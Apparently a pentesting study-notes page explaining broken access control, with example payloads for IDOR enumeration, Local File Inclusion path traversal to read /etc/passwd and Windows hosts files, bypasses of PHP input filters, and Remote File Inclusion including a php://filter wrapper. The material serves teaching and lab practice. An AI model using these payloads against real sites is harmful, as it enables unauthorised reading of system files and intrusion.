---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Broken Access Control

When a user can see or do things they aren't supposed to. The most common ways in which it's presented are:

* **IDOR:** Insecure Direct Object Reference, when an application fail to secure access to restringed data to an user
* **Weak authorization:** Fail to protect sensitive content. Example: Secure admin page with a readable cookie
* **Security through obscurity:** Try to hide secret information in paths that seems  not to be visible.
* **File Inclusion:** Setting routes via URL to access system files or redirecting to another pages

### Example:

* Check if URL contains enumeration of objects

{% code overflow="wrap" lineNumbers="true" %}
```bash
#It is searching for an object with id=2
http://$url/id/2
#We can assume that exist id=1 or any number and try to get it
http://$url/id/$number #This could show objects normally hidden to the user
```
{% endcode %}

***



## <mark style="color:purple;">Local File Inclusion</mark>

Also known as LFI, able to get a website to include a file that was not intended to be an option for this application

### Example:

* Check if parameters in URL recieve name of a file

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Its searching for a file
http://$url/$query?$param=hola.php
#We can try to access to system important files
http://$url/$query?$param=/etc/passwd
```
{% endcode %}

***

* When can't be done directly try to get to root folder

{% code overflow="wrap" lineNumbers="true" %}
```bash
#We use ../ to get to the root directory
http://$url/$query?$param=../../../../../etc/passwd

#Same can be done in windows
http://$url/$query?$param=../../../../../../WINDOWS/system32/drivers/etc/hosts
```
{% endcode %}

{% hint style="info" %}
Is useful to put as many `../` as posible to get to root folder
{% endhint %}

***

* In some cases try to check page code to see conditions of the input

{% code overflow="wrap" lineNumbers="true" %}
```bash
#The code is searching for a file that starts with file
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {

http://$url/$query?$param=file/../../../../etc/passwd

#The code is replacing ../, we can use \ to skip check
$file = str_replace( array( "../", "..\\" ), "", $file );

http://$url/$query?$param=..\/..\/..\/..\/etc/passwd
```
{% endcode %}

***



## <mark style="color:purple;">Remote File Inclusion</mark>

Also known as RFI, it is possible for an attacker to redirect actions to or from a another server

### Example:

* Redirect actions of a server via URL parameters

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">#Its searching for a file
http://$url/$query?$param=hola.php
<strong>#Redirection to another site
</strong>http://$url/$query?$param=http://$url
#Redirection to a local server
http://$url/$query?$param=//$myip
</code></pre>

***

* When blocking type of protocol

{% code overflow="wrap" lineNumbers="true" %}
```bash
#Code is blocking hhtp
$file = str_replace( array( "http", "https" ), "", $file );
#We can use another conection protocol
http://$url/$query?$param=php://filter/resource=/etc/passwd
```
{% endcode %}

***

